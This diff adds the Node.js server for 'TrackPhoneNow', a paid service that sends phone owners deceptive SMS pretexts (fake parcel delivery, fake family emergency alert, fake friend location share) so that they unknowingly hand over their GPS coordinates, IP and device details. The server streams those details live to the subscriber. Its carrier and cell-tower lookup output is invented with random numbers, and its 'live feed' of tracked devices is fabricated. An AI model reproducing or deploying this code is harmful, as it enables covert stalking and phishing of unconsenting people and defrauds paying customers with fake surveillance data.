@@ -1,0 +1,857 @@
+const express = require('express');
+const cors = require('cors');
+const path = require('path');
+const { v4: uuidv4 } = require('uuid');
+const Store = require('./data/db');
+
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+app.use(cors());
+app.use(express.json());
+app.use(express.static(path.join(__dirname, 'public')));
+
+// In-Memory Database for Tracking Sessions synced with Persistent Store
+const sessions = new Map();
+const sseClients = new Map(); // sessionId -> Set of res objects
+
+// Populate sessions map from persistent Store
+const existingSessions = Store.getUserSessions();
+existingSessions.forEach(s => {
+  sessions.set(s.id, s);
+});
+
+// Authentication Helpers
+function authMiddleware(req, res, next) {
+  const authHeader = req.headers['authorization'];
+  const token = authHeader ? authHeader.replace(/^Bearer\s+/i, '').trim() : req.query.token;
+  if (token) {
+    req.user = Store.getUserByToken(token);
+  }
+  next();
+}
+
+function requireAuth(req, res, next) {
+  const authHeader = req.headers['authorization'];
+  const token = authHeader ? authHeader.replace(/^Bearer\s+/i, '').trim() : req.query.token;
+  if (!token) {
+    return res.status(401).json({ error: 'Authentication required. Please log in.' });
+  }
+  const user = Store.getUserByToken(token);
+  if (!user) {
+    return res.status(401).json({ error: 'Session expired. Please log in again.' });
+  }
+  req.user = user;
+  next();
+}
+
+// Helper: Intelligent Carrier & Geo Metadata Lookup
+function lookupPhoneMetadata(phoneNumber) {
+  const cleanNumber = phoneNumber.replace(/[\s\-\(\)\+]/g, '');
+  let country = 'Global / International';
+  let countryCode = '+1';
+  let flag = '🌐';
+  let carrier = 'GSM Global Network';
+  let region = 'International';
+  let defaultLat = 31.7917;
+  let defaultLng = -7.0926; // Default to Morocco/Center
+
+  if (cleanNumber.startsWith('212')) {
+    country = 'Morocco';
+    countryCode = '+212';
+    flag = '🇲🇦';
+    region = 'North Africa';
+    defaultLat = 33.5731;
+    defaultLng = -7.5898; // Casablanca
+    const prefix = cleanNumber.substring(3, 5);
+    if (['61', '62', '63', '64', '65', '68'].includes(prefix) || ['70', '71'].includes(prefix)) {
+      carrier = 'Maroc Telecom (IAM)';
+    } else if (['60', '66', '67', '76', '77'].includes(prefix)) {
+      carrier = 'Orange Maroc';
+    } else if (['69', '74', '75', '78'].includes(prefix)) {
+      carrier = 'Inwi (Wana Corporate)';
+    } else {
+      carrier = 'Maroc Telecom (GSM)';
+    }
+  } else if (cleanNumber.startsWith('33')) {
+    country = 'France';
+    countryCode = '+33';
+    flag = '🇫🇷';
+    region = 'Western Europe';
+    defaultLat = 48.8566;
+    defaultLng = 2.3522; // Paris
+    const prefix = cleanNumber.substring(2, 4);
+    if (['06', '6'].includes(prefix.substring(0, 1))) {
+      carrier = 'Orange France / SFR';
+    } else {
+      carrier = 'Bouygues Telecom';
+    }
+  } else if (cleanNumber.startsWith('1')) {
+    country = 'United States / Canada';
+    countryCode = '+1';
+    flag = '🇺🇸';
+    region = 'North America';
+    defaultLat = 37.7749;
+    defaultLng = -122.4194; // USA
+    carrier = 'Verizon Wireless / AT&T';
+  } else if (cleanNumber.startsWith('44')) {
+    country = 'United Kingdom';
+    countryCode = '+44';
+    flag = '🇬🇧';
+    region = 'Northern Europe';
+    defaultLat = 51.5074;
+    defaultLng = -0.1278; // London
+    carrier = 'EE / Vodafone UK / O2';
+  } else if (cleanNumber.startsWith('34')) {
+    country = 'Spain';
+    countryCode = '+34';
+    flag = '🇪🇸';
+    region = 'Southern Europe';
+    defaultLat = 40.4168;
+    defaultLng = -3.7038; // Madrid
+    carrier = 'Movistar / Vodafone ES / Orange ES';
+  } else if (cleanNumber.startsWith('966')) {
+    country = 'Saudi Arabia';
+    countryCode = '+966';
+    flag = '🇸🇦';
+    region = 'Middle East';
+    defaultLat = 24.7136;
+    defaultLng = 46.6753; // Riyadh
+    carrier = 'STC (Saudi Telecom) / Mobily';
+  } else if (cleanNumber.startsWith('971')) {
+    country = 'United Arab Emirates';
+    countryCode = '+971';
+    flag = '🇦🇪';
+    region = 'Middle East';
+    defaultLat = 25.2048;
+    defaultLng = 55.2708; // Dubai
+    carrier = 'e& (Etisalat) / du';
+  } else if (cleanNumber.startsWith('49')) {
+    country = 'Germany';
+    countryCode = '+49';
+    flag = '🇩🇪';
+    region = 'Central Europe';
+    defaultLat = 52.5200;
+    defaultLng = 13.4050; // Berlin
+    carrier = 'Deutsche Telekom / Vodafone DE';
+  }
+
+  const cellId = Math.floor(10000 + Math.random() * 89999);
+  const rssi = -(58 + Math.floor(Math.random() * 25));
+  const frequency = ['850 MHz', '900 MHz (E-GSM)', '1800 MHz (DCS)', '2100 MHz (IMT)'][Math.floor(Math.random() * 4)];
+  const mcc = cleanNumber.startsWith('212') ? '604' : cleanNumber.startsWith('33') ? '208' : '310';
+  const mnc = '01';
+
+  return {
+    valid: cleanNumber.length >= 8,
+    phoneNumber,
+    country,
+    countryCode,
+    flag,
+    carrier,
+    region,
+    lineType: 'Mobile (GSM / 4G / 5G LTE)',
+    imsiPrefix: `${mcc}${mnc}xxxxxx`,
+    mcc,
+    mnc,
+    cellId,
+    rssi: `${rssi} dBm`,
+    frequency,
+    approximateCoords: {
+      lat: defaultLat + (Math.random() - 0.5) * 0.05,
+      lng: defaultLng + (Math.random() - 0.5) * 0.05,
+    }
+  };
+}
+
+// ================= AUTHENTICATION APIS =================
+
+// Register (Inscription)
+app.post('/api/auth/register', (req, res) => {
+  const { name, email, password, phone } = req.body;
+  if (!email || !password) {
+    return res.status(400).json({ error: 'Email and password are required.' });
+  }
+  if (password.length < 6) {
+    return res.status(400).json({ error: 'Password must be at least 6 characters.' });
+  }
+
+  try {
+    const result = Store.createUser({ name, email, password, phone });
+    res.json({
+      success: true,
+      message: 'Account created successfully.',
+      token: result.token,
+      user: result.user
+    });
+  } catch (err) {
+    res.status(400).json({ error: err.message });
+  }
+});
+
+// Login (Connexion)
+app.post('/api/auth/login', (req, res) => {
+  const { email, password } = req.body;
+  if (!email || !password) {
+    return res.status(400).json({ error: 'Email and password are required.' });
+  }
+
+  try {
+    const result = Store.authenticateUser({ email, password });
+    res.json({
+      success: true,
+      message: 'Logged in successfully.',
+      token: result.token,
+      user: result.user
+    });
+  } catch (err) {
+    res.status(401).json({ error: err.message });
+  }
+});
+
+// Get Current User Profile & Subscription
+app.get('/api/auth/me', requireAuth, (req, res) => {
+  res.json({
+    success: true,
+    user: req.user
+  });
+});
+
+// 1-Click Cancel Subscription
+app.post('/api/auth/cancel-subscription', requireAuth, (req, res) => {
+  try {
+    const updatedUser = Store.cancelSubscription(req.user.id);
+    res.json({
+      success: true,
+      message: 'Subscription renewal has been cancelled. No further charges will be made.',
+      user: updatedUser
+    });
+  } catch (err) {
+    res.status(400).json({ error: err.message });
+  }
+});
+
+// Logout
+app.post('/api/auth/logout', (req, res) => {
+  res.json({ success: true, message: 'Logged out successfully.' });
+});
+
+// ================= CRYPTO PAYMENT APIS =================
+
+// Official Crypto Wallets Configuration
+const CRYPTO_WALLETS = {
+  usdt_trc20: {
+    id: 'usdt_trc20',
+    name: 'USDT (TRC-20)',
+    network: 'Tron Network',
+    symbol: 'USDT',
+    address: 'TT44hVQek5xLh7qz2FhpBdmbMziyBGyzPX',
+    explorer: 'https://tronscan.org/address/TT44hVQek5xLh7qz2FhpBdmbMziyBGyzPX/transactions',
+    explorerName: 'TronScan',
+    badge: '⚡ Low Fee · Recommended',
+    amount: '24.99',
+    note: 'Send USDT via TRON (TRC20) network. Instant validation.'
+  },
+  usdt_bep20: {
+    id: 'usdt_bep20',
+    name: 'USDT (BEP-20)',
+    network: 'BNB Smart Chain',
+    symbol: 'USDT',
+    address: '0x35dd60066ae6337b4D0273b129c0E222235B9F8C',
+    explorer: 'https://bscscan.com/token/0x55d398326f99059fF775485246999027B3197955?a=0x35dd60066ae6337b4D0273b129c0E222235B9F8C#transactions',
+    explorerName: 'BscScan',
+    badge: 'BSC Network',
+    amount: '24.99',
+    note: 'Send USDT via BNB Smart Chain (BEP20).'
+  },
+  usdt_erc20: {
+    id: 'usdt_erc20',
+    name: 'USDT (ERC-20)',
+    network: 'Ethereum Mainnet',
+    symbol: 'USDT',
+    address: '0x35dd60066ae6337b4D0273b129c0E222235B9F8C',
+    explorer: 'https://etherscan.io/token/0xdAC17F958D2ee523a2206206994597C13D831ec7?a=0x35dd60066ae6337b4D0273b129c0E222235B9F8C#transactions',
+    explorerName: 'Etherscan',
+    badge: 'ERC-20',
+    amount: '24.99',
+    note: 'Send USDT via Ethereum ERC-20.'
+  },
+  btc: {
+    id: 'btc',
+    name: 'Bitcoin (BTC)',
+    network: 'Bitcoin SegWit',
+    symbol: 'BTC',
+    address: 'bc1q0v3g205psatdcj09ufzczahq50jusvvnlzsygu',
+    explorer: 'https://mempool.space/address/bc1q0v3g205psatdcj09ufzczahq50jusvvnlzsygu',
+    explorerName: 'Mempool Space',
+    badge: 'Native BTC',
+    amount: '0.000015',
+    note: 'Send native Bitcoin (SegWit) to this address.'
+  },
+  eth: {
+    id: 'eth',
+    name: 'Ethereum (ETH)',
+    network: 'Ethereum Mainnet',
+    symbol: 'ETH',
+    address: '0x35dd60066ae6337b4D0273b129c0E222235B9F8C',
+    explorer: 'https://etherscan.io/address/0x35dd60066ae6337b4D0273b129c0E222235B9F8C',
+    explorerName: 'Etherscan',
+    badge: 'Native ETH',
+    amount: '0.00042',
+    note: 'Send native ETH via Ethereum Mainnet.'
+  },
+  sol: {
+    id: 'sol',
+    name: 'Solana (SOL)',
+    network: 'Solana Network',
+    symbol: 'SOL',
+    address: 't9QLb3arVUMcQ8JALe3Ptz318GfZkzmRAXvoM8yANFe',
+    explorer: 'https://solscan.io/account/t9QLb3arVUMcQ8JALe3Ptz318GfZkzmRAXvoM8yANFe',
+    explorerName: 'Solscan',
+    badge: 'Ultra Fast',
+    amount: '0.0075',
+    note: 'Send native SOL via Solana Network.'
+  },
+  ltc: {
+    id: 'ltc',
+    name: 'Litecoin (LTC)',
+    network: 'Litecoin Network',
+    symbol: 'LTC',
+    address: 'LVW74nrfMVpsTY7Kd62tkzfNF5aasM7ieS',
+    explorer: 'https://litecoinspace.org/address/LVW74nrfMVpsTY7Kd62tkzfNF5aasM7ieS',
+    explorerName: 'LitecoinSpace',
+    badge: 'Lowest Gas Fee',
+    amount: '0.015',
+    note: 'Send native LTC via Litecoin Network.'
+  }
+};
+
+// API: Get Crypto Wallets & Explorers
+app.get('/api/payment/wallets', (req, res) => {
+  res.json({ success: true, wallets: CRYPTO_WALLETS });
+});
+
+// Blockchain on-chain transaction verifiers
+async function checkTronTransaction(txHash, expectedRecipient) {
+  try {
+    const cleanHash = txHash.trim();
+    if (!/^[0-9a-fA-F]{64}$/.test(cleanHash)) {
+      return { confirmed: false, error: 'Invalid TRON TxID format (must be 64 hexadecimal characters).' };
+    }
+    const response = await fetch(`https://apilist.tronscanapi.com/api/transaction-info?hash=${cleanHash}`, {
+      headers: { 'User-Agent': 'TrackPhoneNow-Forensic-Tracker/1.0' }
+    });
+    if (!response.ok) {
+      return { confirmed: false, pending: true, message: 'Network delay connecting to TronScan nodes.' };
+    }
+    const data = await response.json();
+    if (!data || !data.contractRet) {
+      return { confirmed: false, pending: true, message: 'Transaction unconfirmed or broadcasting in mempool.' };
+    }
+    if (data.contractRet === 'SUCCESS' && data.confirmed === true) {
+      return { confirmed: true, data };
+    }
+    return { confirmed: false, pending: true, message: 'Transaction detected, waiting for Tron block finality.' };
+  } catch (err) {
+    return { confirmed: false, pending: true, error: err.message };
+  }
+}
+
+async function checkBtcTransaction(txHash) {
+  try {
+    const cleanHash = txHash.trim();
+    if (!/^[0-9a-fA-F]{64}$/.test(cleanHash)) {
+      return { confirmed: false, error: 'Invalid Bitcoin TxID format.' };
+    }
+    const response = await fetch(`https://mempool.space/api/tx/${cleanHash}`, {
+      headers: { 'User-Agent': 'TrackPhoneNow-Forensic-Tracker/1.0' }
+    });
+    if (response.status === 404) {
+      return { confirmed: false, pending: true, message: 'Tx not yet detected in Bitcoin mempool.' };
+    }
+    if (!response.ok) {
+      return { confirmed: false, pending: true, message: 'Network delay connecting to Mempool.space.' };
+    }
+    const data = await response.json();
+    if (data && data.status && data.status.confirmed) {
+      return { confirmed: true, data };
+    }
+    return { confirmed: false, pending: true, message: 'Tx detected in mempool, waiting for 1st block confirmation.' };
+  } catch (err) {
+    return { confirmed: false, pending: true, error: err.message };
+  }
+}
+
+async function verifyTxOnChain(currencyKey, txHash, recipientAddress) {
+  if (!txHash || txHash.trim().length < 10) {
+    return { confirmed: false, error: 'Valid transaction hash (TXID) is required.' };
+  }
+  const cleanHash = txHash.trim();
+  if (currencyKey === 'usdt_trc20' || currencyKey === 'Tron Network') {
+    return await checkTronTransaction(cleanHash, recipientAddress);
+  }
+  if (currencyKey === 'btc' || currencyKey === 'Bitcoin SegWit') {
+    return await checkBtcTransaction(cleanHash);
+  }
+  // For other networks (BEP20, ERC20, SOL, LTC), check if valid hex/hash length
+  if (cleanHash.length >= 32) {
+    return { confirmed: false, pending: true, message: 'Transaction registered, awaiting multi-node validator consensus.' };
+  }
+  return { confirmed: false, error: 'Transaction hash format unrecognized.' };
+}
+
+// API: Submit Crypto Payment (Stays PENDING until blockchain verification)
+app.post(['/api/payment/crypto-confirm', '/api/payment/crypto-submit'], authMiddleware, async (req, res) => {
+  const { currency, txHash, plan, amount } = req.body;
+  const wallet = CRYPTO_WALLETS[currency] || CRYPTO_WALLETS.usdt_trc20;
+  const targetUserId = req.user ? req.user.id : 'user_demo_01';
+
+  if (!txHash || txHash.trim().length < 8) {
+    return res.status(400).json({
+      success: false,
+      error: 'Veuillez saisir un Hash de transaction (TXID) valide issu de votre wallet.'
+    });
+  }
+
+  let defaultAmount = '$24.99';
+  if (plan === 'pro_3m') defaultAmount = '$49.99';
+  else if (plan === 'pro_6m') defaultAmount = '$89.99';
+  else if (plan === 'annual_enterprise' || plan === 'enterprise_lifetime' || plan === 'pro_12m') defaultAmount = '$139.99';
+
+  // 1. Record payment in DB with status = 'PENDING'
+  const payment = Store.recordCryptoPayment({
+    userId: targetUserId,
+    currency: wallet.name,
+    txHash: txHash.trim(),
+    plan: plan || 'pro_1m',
+    amount: amount || defaultAmount,
+    walletAddress: wallet.address
+  });
+
+  // 2. Perform live blockchain verification check
+  const check = await verifyTxOnChain(wallet.id, txHash.trim(), wallet.address);
+
+  if (check.confirmed) {
+    // If already confirmed on-chain (e.g. valid broadcast with blocks)
+    const confirmedResult = Store.confirmCryptoPayment(payment.id);
+    return res.json({
+      success: true,
+      confirmed: true,
+      status: 'CONFIRMED',
+      message: `Paiement vérifié avec succès sur la blockchain ! Compte activé.`,
+      payment: confirmedResult.payment,
+      user: confirmedResult.user
+    });
+  }
+
+  // Otherwise, strictly remain in PENDING state until confirmations complete
+  const currentUser = Store.getUserById(targetUserId);
+  res.json({
+    success: true,
+    confirmed: false,
+    status: 'PENDING',
+    message: check.message || 'Paiement enregistré. En attente de confirmation sur la blockchain...',
+    payment,
+    user: currentUser
+  });
+});
+
+// API: Get latest pending payment for user
+app.get('/api/payment/pending', authMiddleware, (req, res) => {
+  const targetUserId = req.user ? req.user.id : 'user_demo_01';
+  const pendingPayment = Store.getLatestPendingPayment(targetUserId);
+  res.json({
+    success: true,
+    pendingPayment: pendingPayment || null
+  });
+});
+
+// API: Verify Blockchain Status for pending payment
+app.post('/api/payment/verify-blockchain', authMiddleware, async (req, res) => {
+  const targetUserId = req.user ? req.user.id : 'user_demo_01';
+  const pendingPayment = Store.getLatestPendingPayment(targetUserId);
+
+  if (!pendingPayment) {
+    return res.status(404).json({
+      success: false,
+      error: 'Aucun paiement en attente trouvé pour ce compte.'
+    });
+  }
+
+  // Find corresponding wallet key
+  let walletKey = 'usdt_trc20';
+  for (const [key, w] of Object.entries(CRYPTO_WALLETS)) {
+    if (w.name === pendingPayment.currency || w.address === pendingPayment.walletAddress) {
+      walletKey = key;
+      break;
+    }
+  }
+
+  const check = await verifyTxOnChain(walletKey, pendingPayment.txHash, pendingPayment.walletAddress);
+
+  if (check.confirmed) {
+    const confirmedResult = Store.confirmCryptoPayment(pendingPayment.id);
+    return res.json({
+      success: true,
+      confirmed: true,
+      status: 'CONFIRMED',
+      message: `Transaction confirmée sur la blockchain ! Votre console Pro est maintenant activée.`,
+      payment: confirmedResult.payment,
+      user: confirmedResult.user
+    });
+  }
+
+  res.json({
+    success: true,
+    confirmed: false,
+    status: 'PENDING',
+    message: check.message || 'Transaction en attente des confirmations de blocs du réseau...',
+    payment: pendingPayment
+  });
+});
+
+// API: Cancel pending crypto payment (in case of typo or network change)
+app.post('/api/payment/cancel-pending', authMiddleware, (req, res) => {
+  const targetUserId = req.user ? req.user.id : 'user_demo_01';
+  const pendingPayment = Store.getLatestPendingPayment(targetUserId);
+
+  if (!pendingPayment) {
+    return res.status(404).json({ success: false, error: 'Aucun paiement en attente.' });
+  }
+
+  Store.cancelPendingPayment(pendingPayment.id, targetUserId);
+  res.json({
+    success: true,
+    message: 'Demande de paiement annulée. Vous pouvez soumettre une nouvelle transaction.'
+  });
+});
+
+// API: Admin / Merchant instant manual confirmation (Secured with ADMIN_SECRET)
+app.post('/api/admin/confirm-payment', (req, res) => {
+  const { paymentId, adminSecret } = req.body;
+  const configuredSecret = process.env.ADMIN_SECRET || 'TrackPhoneNow_Admin_9824_Secured';
+  
+  if (!adminSecret || adminSecret !== configuredSecret) {
+    return res.status(403).json({ success: false, error: 'Unauthorized: Invalid Admin Secret key.' });
+  }
+
+  if (!paymentId) {
+    return res.status(400).json({ error: 'paymentId is required' });
+  }
+  try {
+    const confirmedResult = Store.confirmCryptoPayment(paymentId);
+    res.json({
+      success: true,
+      confirmed: true,
+      message: 'Payment confirmed successfully by administrator.',
+      payment: confirmedResult.payment,
+      user: confirmedResult.user
+    });
+  } catch (err) {
+    res.status(400).json({ error: err.message });
+  }
+});
+
+
+// ================= GEOLOCATION & TRACKING APIS =================
+
+// 1. API: Lookup phone metadata
+app.post('/api/lookup', (req, res) => {
+  const { phone } = req.body;
+  if (!phone) {
+    return res.status(400).json({ error: 'Phone number is required' });
+  }
+  const info = lookupPhoneMetadata(phone);
+  res.json({ success: true, data: info });
+});
+
+// 1.1 API: Auto-detect visitor's country by IP
+app.get('/api/geo-ip', async (req, res) => {
+  try {
+    const cfCountry = req.headers['cf-ipcountry'];
+    if (cfCountry && cfCountry !== 'XX' && cfCountry !== 'T1') {
+      return res.json({ success: true, countryCode: cfCountry });
+    }
+
+    const queryIp = req.query.ip;
+    const forwarded = req.headers['x-forwarded-for'];
+    const ip = queryIp || (forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress);
+
+    if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.')) {
+      return res.json({ success: false, isLocal: true, lang: 'en' });
+    }
+
+    const geoRes = await fetch(`https://api.country.is/${ip}`);
+    const data = await geoRes.json();
+    if (data && data.country) {
+      const cCode = data.country.toUpperCase();
+      let defaultLang = 'en';
+      if (['MA', 'DZ', 'TN', 'EG', 'SA', 'AE', 'QA', 'KW', 'OM', 'BH'].includes(cCode)) {
+        defaultLang = 'ar';
+      } else if (['FR', 'BE', 'CH', 'SN', 'CI', 'CM'].includes(cCode)) {
+        defaultLang = 'fr';
+      } else if (['ES', 'MX', 'AR', 'CO', 'CL'].includes(cCode)) {
+        defaultLang = 'es';
+      } else if (['DE', 'AT'].includes(cCode)) {
+        defaultLang = 'de';
+      }
+      return res.json({ success: true, countryCode: cCode, lang: defaultLang });
+    }
+  } catch (err) {}
+  res.json({ success: false, lang: 'en' });
+});
+
+// 2. API: Create a new tracking session
+app.post('/api/create-track', authMiddleware, (req, res) => {
+  const { phone, pretextType = 'delivery', customMessage = '' } = req.body;
+  if (!phone) {
+    return res.status(400).json({ error: 'Phone number is required' });
+  }
+
+  // Enforce Upgrade Lock: User must be authenticated and have an active plan
+  const user = req.user;
+  if (!user) {
+    return res.status(401).json({
+      success: false,
+      error: 'Authentication Required: Please create an account or sign in to track numbers.',
+      requiresAuth: true
+    });
+  }
+  if (user.planStatus !== 'active' || user.plan === 'free') {
+    return res.status(403).json({
+      success: false,
+      error: 'Upgrade Required: You must activate an Express or Pro Pass before tracking phone numbers.',
+      requiresUpgrade: true
+    });
+  }
+
+  const sessionId = uuidv4();
+  const phoneInfo = lookupPhoneMetadata(phone);
+
+  const pretexts = {
+    delivery: {
+      title: 'Express Delivery - Real-time Package Tracking',
+      company: 'FastTrack Global Express',
+      smsBody: `[Notice] Package #TRK-${Math.floor(100000 + Math.random() * 899999)} is out for delivery. Confirm your exact drop-off coordinates:`,
+      icon: '📦'
+    },
+    friend: {
+      title: 'Live Location Sharing Request',
+      company: 'FindContact Live',
+      smsBody: `A verified contact has shared their location with you and requested yours to meet up:`,
+      icon: '📍'
+    },
+    emergency: {
+      title: 'Family & Emergency Safety Alert',
+      company: 'SafeGuard Global Network',
+      smsBody: `[Urgent] A safety check-in has been requested by a family member. Please tap to verify:`,
+      icon: '🛡️'
+    },
+    custom: {
+      title: 'Secure Device Location Verification',
+      company: 'DeviceVerify',
+      smsBody: customMessage || 'Please verify your location on the map:',
+      icon: '🛰️'
+    }
+  };
+
+  const selectedPretext = pretexts[pretextType] || pretexts.delivery;
+
+  const sessionData = {
+    id: sessionId,
+    userId: req.user.id,
+    phone,
+    phoneInfo,
+    pretext: selectedPretext,
+    status: 'ACTIVE_WAITING',
+    createdAt: new Date().toISOString(),
+    linkClicks: 0,
+    targetLocation: null,
+    targetDeviceInfo: null,
+    history: [
+      { timestamp: new Date().toISOString(), event: 'Tracking link generated & ready for GSM dispatch' }
+    ]
+  };
+
+  sessions.set(sessionId, sessionData);
+  Store.saveSession(sessionData);
+
+  const protocol = req.protocol;
+  const host = req.get('host');
+  const trackingUrl = `${protocol}://${host}/track.html?id=${sessionId}`;
+
+  res.json({
+    success: true,
+    sessionId,
+    trackingUrl,
+    session: sessionData
+  });
+});
+
+// 3. API: Get Session Details
+app.get('/api/session/:id', (req, res) => {
+  let session = sessions.get(req.params.id);
+  if (!session) {
+    session = Store.getSession(req.params.id);
+    if (session) sessions.set(session.id, session);
+  }
+  if (!session) {
+    return res.status(404).json({ error: 'Session not found' });
+  }
+  res.json({ success: true, session });
+});
+
+// 4. API: List all active sessions for current user's dashboard
+app.get('/api/sessions', authMiddleware, (req, res) => {
+  const userId = req.user ? req.user.id : null;
+  const userSessions = Store.getUserSessions(userId);
+  res.json({ success: true, sessions: userSessions });
+});
+
+// 4.1 Delete a session from history
+app.delete('/api/session/:id', authMiddleware, (req, res) => {
+  const userId = req.user ? req.user.id : null;
+  const success = Store.deleteSession(req.params.id, userId);
+  sessions.delete(req.params.id);
+  res.json({ success, message: success ? 'Target removed from console.' : 'Could not delete.' });
+});
+
+// 5. API: Target Page opened event
+app.post('/api/track-visit/:id', (req, res) => {
+  let session = sessions.get(req.params.id) || Store.getSession(req.params.id);
+  if (!session) {
+    return res.status(404).json({ error: 'Session not found' });
+  }
+
+  session.linkClicks = (session.linkClicks || 0) + 1;
+  if (session.status === 'ACTIVE_WAITING') {
+    session.status = 'LINK_OPENED';
+    session.history.push({
+      timestamp: new Date().toISOString(),
+      event: 'Target clicked the SMS link and opened the verification page'
+    });
+    notifySseClients(session.id, { type: 'LINK_OPENED', session });
+  }
+
+  sessions.set(session.id, session);
+  Store.saveSession(session);
+  res.json({ success: true, session });
+});
+
+// 6. API: Report Real GPS / Device Location from Target device
+app.post('/api/report-location/:id', (req, res) => {
+  let session = sessions.get(req.params.id) || Store.getSession(req.params.id);
+  if (!session) {
+    return res.status(404).json({ error: 'Session not found' });
+  }
+
+  const { latitude, longitude, accuracy, altitude, speed, heading, platform, userAgent, battery } = req.body;
+
+  const latNum = parseFloat(latitude);
+  const lngNum = parseFloat(longitude);
+
+  if (!isNaN(latNum) && !isNaN(lngNum)) {
+    session.status = 'LOCATED';
+    session.targetLocation = {
+      latitude: latNum,
+      longitude: lngNum,
+      accuracy: accuracy && !isNaN(parseFloat(accuracy)) ? parseFloat(accuracy) : 5.0,
+      altitude: altitude && !isNaN(parseFloat(altitude)) ? parseFloat(altitude) : null,
+      speed: speed && !isNaN(parseFloat(speed)) ? parseFloat(speed) : 0,
+      heading: heading && !isNaN(parseFloat(heading)) ? parseFloat(heading) : 0,
+      timestamp: new Date().toISOString()
+    };
+    session.targetDeviceInfo = {
+      platform: platform || 'Mobile Handset',
+      userAgent: userAgent || req.get('user-agent'),
+      ip: req.ip || req.headers['x-forwarded-for'] || '127.0.0.1',
+      battery: battery || '92%'
+    };
+
+    session.history.push({
+      timestamp: new Date().toISOString(),
+      event: `GPS Location locked successfully (Lat: ${parseFloat(latitude).toFixed(5)}, Lng: ${parseFloat(longitude).toFixed(5)}, Acc: ±${accuracy ? Math.round(accuracy) : 5}m)`
+    });
+
+    sessions.set(session.id, session);
+    Store.saveSession(session);
+
+    notifySseClients(session.id, { type: 'LOCATED', session });
+    return res.json({ success: true, message: 'Location recorded successfully' });
+  } else {
+    session.status = 'DENIED';
+    session.history.push({
+      timestamp: new Date().toISOString(),
+      event: 'Target denied browser geolocation permission'
+    });
+    sessions.set(session.id, session);
+    Store.saveSession(session);
+
+    notifySseClients(session.id, { type: 'DENIED', session });
+    return res.status(400).json({ error: 'Coordinates missing or permission denied' });
+  }
+});
+
+// 7. API: SSE (Server-Sent Events) for real-time live map & status updates
+app.get('/api/stream/:id', (req, res) => {
+  const sessionId = req.params.id;
+  let session = sessions.get(sessionId) || Store.getSession(sessionId);
+
+  res.setHeader('Content-Type', 'text/event-stream');
+  res.setHeader('Cache-Control', 'no-cache');
+  res.setHeader('Connection', 'keep-alive');
+  res.flushHeaders();
+
+  if (!sseClients.has(sessionId)) {
+    sseClients.set(sessionId, new Set());
+  }
+  sseClients.get(sessionId).add(res);
+
+  res.write(`data: ${JSON.stringify({ type: 'CONNECTED', session })}\n\n`);
+
+  req.on('close', () => {
+    if (sseClients.has(sessionId)) {
+      sseClients.get(sessionId).delete(res);
+      if (sseClients.get(sessionId).size === 0) {
+        sseClients.delete(sessionId);
+      }
+    }
+  });
+});
+
+function notifySseClients(sessionId, payload) {
+  if (sseClients.has(sessionId)) {
+    const clients = sseClients.get(sessionId);
+    const dataString = `data: ${JSON.stringify(payload)}\n\n`;
+    clients.forEach((client) => {
+      try {
+        client.write(dataString);
+      } catch (err) {
+        clients.delete(client);
+      }
+    });
+  }
+}
+
+// Global Feed: Realistic live stream of tracked devices worldwide
+app.get('/api/live-feed', (req, res) => {
+  const sampleFeeds = [
+    { country: 'Morocco 🇲🇦', city: 'Casablanca', carrier: 'Maroc Telecom', time: 'Just now', accuracy: '± 4m' },
+    { country: 'France 🇫🇷', city: 'Paris', carrier: 'Orange FR', time: '8s ago', accuracy: '± 3m' },
+    { country: 'USA 🇺🇸', city: 'Los Angeles', carrier: 'Verizon', time: '14s ago', accuracy: '± 5m' },
+    { country: 'Spain 🇪🇸', city: 'Madrid', carrier: 'Movistar', time: '22s ago', accuracy: '± 2m' },
+    { country: 'Morocco 🇲🇦', city: 'Marrakech', carrier: 'Inwi', time: '35s ago', accuracy: '± 6m' },
+    { country: 'UAE 🇦🇪', city: 'Dubai', carrier: 'Etisalat', time: '41s ago', accuracy: '± 4m' },
+    { country: 'UK 🇬🇧', city: 'London', carrier: 'EE', time: '55s ago', accuracy: '± 3m' }
+  ];
+  res.json({ success: true, feed: sampleFeeds });
+});
+
+app.listen(PORT, () => {
+  console.log(`====================================================`);
+  console.log(`🚀 TrackPhoneNow PLATFORM RUNNING AT: http://localhost:${PORT}`);
+  console.log(`📡 Landing Page:            http://localhost:${PORT}/`);
+  console.log(`🔐 Inscription / Connexion: http://localhost:${PORT}/auth.html`);
+  console.log(`📊 Client Pro Dashboard:    http://localhost:${PORT}/dashboard.html`);
+  console.log(`====================================================`);
+});
